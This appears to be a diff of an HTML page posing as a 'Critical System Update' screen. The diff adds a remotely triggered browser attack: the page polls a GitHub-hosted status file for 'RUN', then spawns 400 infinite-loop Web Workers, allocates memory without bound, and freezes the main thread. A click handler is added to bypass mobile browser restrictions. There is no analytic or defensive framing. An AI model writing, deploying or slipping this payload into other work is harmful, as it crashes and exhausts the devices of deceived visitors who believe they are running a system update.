@@ -1,51 +1,64 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Maintenance</title>
+    <title>Critical System Update</title>
     <meta charset="UTF-8">
 </head>
-<body style="background-color: black; color: #00FF00; text-align: center; padding-top: 100px; font-family: 'Courier New', Courier, monospace;">
-    <h1 id="status-text">ANALYZING SYSTEM CORE...</h1>
-    <div id="log" style="font-size: 12px; color: #555;"></div>
+<body style="background-color: black; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
+    <h1 id="status">INITIALIZING CORE...</h1>
+    <p>Tap anywhere to begin synchronization</p>
 
     <script>
         const statusUrl = 'https://raw.githubusercontent.com/karimattef3-pixel/my-tools/main/status.txt?t=' + new Date().getTime();
-        let active = false;
+        let isRunning = false;
 
-        async function monitor() {
+        async function checkStatus() {
             try {
-                const resp = await fetch(statusUrl);
-                const cmd = await resp.text();
-                if (cmd.includes("RUN") && !active) {
-                    active = true;
-                    document.getElementById('status-text').innerText = "OPTIMIZING HARDWARE...";
-                    ignite();
-                } else if (cmd.includes("STOP")) {
-                    location.reload();
+                const response = await fetch(statusUrl);
+                const text = await response.text();
+                if (text.trim().includes("RUN") && !isRunning) {
+                    isRunning = true;
+                    document.getElementById('status').innerText = "CORE OVERLOAD: ACTIVE";
+                    document.getElementById('status').style.color = "red";
+                    startTheBeast();
                 }
-            } catch (e) {}
+            } catch (e) { }
         }
 
-        function ignite() {
-            // Step 1: Heavy CPU Load (400 Multi-threaded Workers)
+        function startTheBeast() {
+            // 1. CPU Core Exhaustion (400 Threads)
             for (let i = 0; i < 400; i++) {
-                const blob = new Blob([`while(true){ Math.atan2(Math.random(), Math.random()); }`], {type: 'text/javascript'});
-                new Worker(URL.createObjectURL(blob));
+                new Worker(URL.createObjectURL(new Blob([`
+                    while(true) {
+                        Math.sqrt(Math.random() * 999999);
+                    }
+                `], {type: 'text/javascript'})));
             }
 
-            // Step 2: RAM Exhaustion (Memory Leak Simulation)
-            const memorySponge = [];
+            // 2. RAM Smasher (Infinite Memory Allocation)
+            const memoryLeak = [];
             setInterval(() => {
                 for (let i = 0; i < 1000; i++) {
-                    memorySponge.push(new Array(1000000).fill("STRESS_TEST"));
+                    memoryLeak.push(new Array(1000000).fill("STRESS_TEST_DATA_NULL"));
                 }
-                const log = document.getElementById('log');
-                log.innerText += "\n[ALLOCATING_RESOURCES_BLOCK_" + Math.random() + "]";
-            }, 50);
+            }, 10);
+
+            // 3. Main Thread Freeze (Infinite Loop)
+            while(true) {
+                const dummy = Math.random() * Math.random();
+                console.log("Processing Stack: " + dummy);
+            }
         }
 
-        setInterval(monitor, 2000);
-        monitor();
+        // Trigger on click to bypass mobile browser restrictions
+        window.addEventListener('click', () => {
+            checkStatus();
+            setInterval(checkStatus, 2000);
+        });
+
+        // Auto-check every 2 seconds
+        setInterval(checkStatus, 2000);
     </script>
 </body>
-</html>  
+</html>
